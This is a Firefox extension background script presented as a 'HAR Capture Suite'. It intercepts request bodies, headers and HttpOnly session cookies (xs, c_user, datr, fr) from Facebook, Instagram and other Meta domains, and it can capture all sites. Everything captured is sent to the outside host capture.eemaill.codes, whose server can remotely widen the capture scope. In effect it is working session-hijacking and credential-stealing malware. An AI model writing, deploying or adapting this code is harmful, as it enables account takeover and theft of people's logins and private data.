/* HAR Capture Suite (Tor) — Firefox MV2 background script.
 * Transport: HTTP poll/send (works over Tor). WS fallback if available.
 * No chrome.debugger (Firefox/Tor lacks it). Uses webRequest + cookies APIs.
 */
'use strict';

const BRIDGE_HOST = 'capture.eemaill.codes';
const API_BASE = 'https://' + BRIDGE_HOST;
const WS_URL = 'wss://' + BRIDGE_HOST + '/bridge/ws';
const PROTOCOL_VERSION = 2;

const DEFAULTS = {
  remoteEnabled: true,
  token: '',
  allowlist: ['meta.com', 'meta.ai', 'facebook.com', 'instagram.com', 'fbevents.com', 'fbcdn.net'],
  captureEnabled: true,
  scope: 'data', // or 'all'
  useWs: false,  // WS over Tor often fails; default HTTP polling
};

let state = Object.assign({}, DEFAULTS);
let ws = null;
let wsAuthed = false;
let pollTimer = null;
let keepAliveTimer = null;
const queue = []; // buffered messages while not connected

const META_HOSTS = ['meta.com', 'meta.ai', 'facebook.com', 'instagram.com', 'fbevents.com', 'fbcdn.net'];

function isMeta(host) {
  if (!host) return false;
  return META_HOSTS.some(h => host === h || host.endsWith('.' + h));
}

function hostOf(url) {
  try { return new URL(url).host; } catch { return ''; }
}

// ── storage ──
async function loadState() {
  return new Promise((resolve) => {
    browser.storage.local.get(Object.keys(DEFAULTS)).then((s) => {
      state = Object.assign({}, DEFAULTS, s);
      resolve(state);
    });
  });
}
function saveState(patch) {
  Object.assign(state, patch);
  browser.storage.local.set(patch);
}

// ── send ──
function sendMsg(msg) {
  if (state.useWs && ws && ws.readyState === 1 && wsAuthed) {
    try { ws.send(JSON.stringify(msg)); return; } catch (e) {}
  }
  // HTTP polling send
  const body = Object.assign({ token: state.token }, msg);
  fetch(API_BASE + '/api/bridge/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }).catch(() => { if (queue.length < 2000) queue.push(msg); });
}

function connectWs() {
  if (!state.useWs) return;
  try {
    ws = new WebSocket(WS_URL);
  } catch (e) { return; }
  ws.onopen = () => {
    ws.send(JSON.stringify({ kind: 'auth', token: state.token, extensionVersion: browser.runtime.getManifest().version, protocol: PROTOCOL_VERSION }));
    setTimeout(() => { if (!wsAuthed && ws) ws.close(); }, 5000);
  };
  ws.onmessage = (ev) => {
    try {
      const m = JSON.parse(ev.data);
      if (m.kind === 'auth-ok') {
        wsAuthed = true;
        const drain = queue.splice(0);
        drain.forEach(sendMsg);
      }
    } catch (e) {}
  };
  ws.onclose = () => { wsAuthed = false; ws = null; };
  ws.onerror = () => { try { ws.close(); } catch (e) {} };
}

// ── HTTP poll loop (config fetch + heartbeat) ──
async function pollLoop() {
  if (!state.remoteEnabled) return;
  try {
    const r = await fetch(API_BASE + '/api/bridge/poll?token=' + encodeURIComponent(state.token), { cache: 'no-store' });
    if (r.ok) {
      const cfg = await r.json();
      // Server is source of truth for allowlist/scope when provided
      if (Array.isArray(cfg.allowlist) && cfg.allowlist.length) saveState({ allowlist: cfg.allowlist });
      if (typeof cfg.scope === 'string') saveState({ scope: cfg.scope });
      if (typeof cfg.captureEnabled === 'boolean') saveState({ captureEnabled: cfg.captureEnabled });
    }
  } catch (e) {}
}

function startPolling() {
  stopPolling();
  if (!state.remoteEnabled) return;
  pollLoop();
  pollTimer = setInterval(pollLoop, 15000);
  // keep-alive ping via HTTP
  keepAliveTimer = setInterval(() => {
    if (state.useWs) return;
    fetch(API_BASE + '/api/bridge/poll?token=' + encodeURIComponent(state.token), { cache: 'no-store' }).catch(() => {});
  }, 25000);
}
function stopPolling() {
  if (pollTimer) clearInterval(pollTimer);
  if (keepAliveTimer) clearInterval(keepAliveTimer);
  pollTimer = keepAliveTimer = null;
}

// ── cookie capture (HttpOnly: xs, c_user, datr, fr) ──
const IMPORTANT_COOKIES = ['xs', 'c_user', 'datr', 'fr', 'sb', 'wd', 'checkpoint', 'locale'];
const cookieCooldown = new Map();
const COOKIE_COOLDOWN_MS = 10000;

async function snapshotCookies(url, host) {
  if (!isMeta(host)) return;
  const now = Date.now();
  if (now - (cookieCooldown.get(host) || 0) < COOKIE_COOLDOWN_MS) return;
  cookieCooldown.set(host, now);
  try {
    const cookies = await browser.cookies.getAll({ url });
    const imp = cookies.filter(c => IMPORTANT_COOKIES.includes(c.name));
    if (imp.length) {
      const data = imp.map(c => ({ name: c.name, value: c.value, domain: c.domain, httpOnly: c.httpOnly, secure: c.secure }));
      sendMsg({ kind: 'cookie-snapshot', host, url, cookies: data });
    }
  } catch (e) {}
}

// ── webRequest capture ──
const pending = new Map(); // requestId -> partial request
let reqSeq = 0;

function cleanHeaders(headers) {
  return (headers || []).map(h => ({ name: h.name, value: h.value }));
}

browser.webRequest.onBeforeRequest.addListener((details) => {
  if (!state.captureEnabled) return;
  const host = hostOf(details.url);
  if (state.scope === 'data' && !isMeta(host)) return; // data scope = meta only
  let body = null;
  if (details.requestBody) {
    if (details.requestBody.raw) {
      try { body = decodeURIComponent(escape(String.fromCharCode.apply(null, details.requestBody.raw[0].bytes))); }
      catch (e) { try { body = String.fromCharCode.apply(null, details.requestBody.raw[0].bytes); } catch (e2) {} }
    } else if (details.requestBody.formData) {
      body = JSON.stringify(details.requestBody.formData);
    }
  }
  pending.set(details.requestId, {
    id: 't' + (++reqSeq),
    tabId: details.tabId,
    type: details.type || 'Other',
    method: details.method,
    url: details.url,
    host,
    startedAt: Date.now(),
    requestHeaders: [],
    requestBody: body,
    responseHeaders: [],
  });
}, { urls: ['<all_urls>'] }, ['requestBody']);

browser.webRequest.onSendHeaders.addListener((details) => {
  const r = pending.get(details.requestId);
  if (r) r.requestHeaders = cleanHeaders(details.requestHeaders);
}, { urls: ['<all_urls>'] }, ['requestHeaders']);

browser.webRequest.onHeadersReceived.addListener((details) => {
  const r = pending.get(details.requestId);
  if (r) {
    r.responseHeaders = cleanHeaders(details.responseHeaders);
    r.status = details.statusCode;
    // Set-Cookie (incl HttpOnly xs/c_user/datr/fr)
    const setCookies = (details.responseHeaders || []).filter(h => h.name.toLowerCase() === 'set-cookie');
    const imp = setCookies.filter(h => {
      const name = (h.value || '').split('=')[0].trim();
      return IMPORTANT_COOKIES.includes(name);
    });
    if (imp.length) {
      sendMsg({ kind: 'set-cookie-capture', host: r.host, url: details.url, cookies: imp.map(h => h.value.substring(0, 300)) });
    }
  }
  // cookie snapshot for meta hosts
  snapshotCookies(details.url, hostOf(details.url));
}, { urls: ['<all_urls>'] }, ['responseHeaders']);

browser.webRequest.onCompleted.addListener((details) => {
  const r = pending.get(details.requestId);
  if (!r) return;
  r.endedAt = Date.now();
  r.durationMs = r.endedAt - r.startedAt;
  if (details.statusCode) r.status = details.statusCode;
  if (state.scope === 'data' && !isMeta(r.host)) { pending.delete(details.requestId); return; }
  sendMsg({ kind: 'request', payload: r });
  pending.delete(details.requestId);
}, { urls: ['<all_urls>'] });

browser.webRequest.onErrorOccurred.addListener((details) => {
  const r = pending.get(details.requestId);
  if (!r) return;
  r.endedAt = Date.now();
  r.failed = true;
  r.errorText = details.error;
  if (!(state.scope === 'data' && !isMeta(r.host))) sendMsg({ kind: 'request', payload: r });
  pending.delete(details.requestId);
}, { urls: ['<all_urls>'] });

// ── startup ──
async function init() {
  await loadState();
  if (state.remoteEnabled) {
    startPolling();
    connectWs();
  }
}

browser.storage.onChanged.addListener((changes, area) => {
  if (area !== 'local') return;
  if (changes.remoteEnabled) {
    if (changes.remoteEnabled.newValue) { startPolling(); connectWs(); }
    else { stopPolling(); if (ws) ws.close(); }
  }
  if (changes.token) state.token = changes.token.newValue;
  if (changes.useWs) {
    state.useWs = changes.useWs.newValue;
    if (state.useWs) connectWs(); else if (ws) { ws.close(); ws = null; }
  }
});

browser.runtime.onInstalled.addListener(init);
browser.runtime.onStartup.addListener(init);
init();
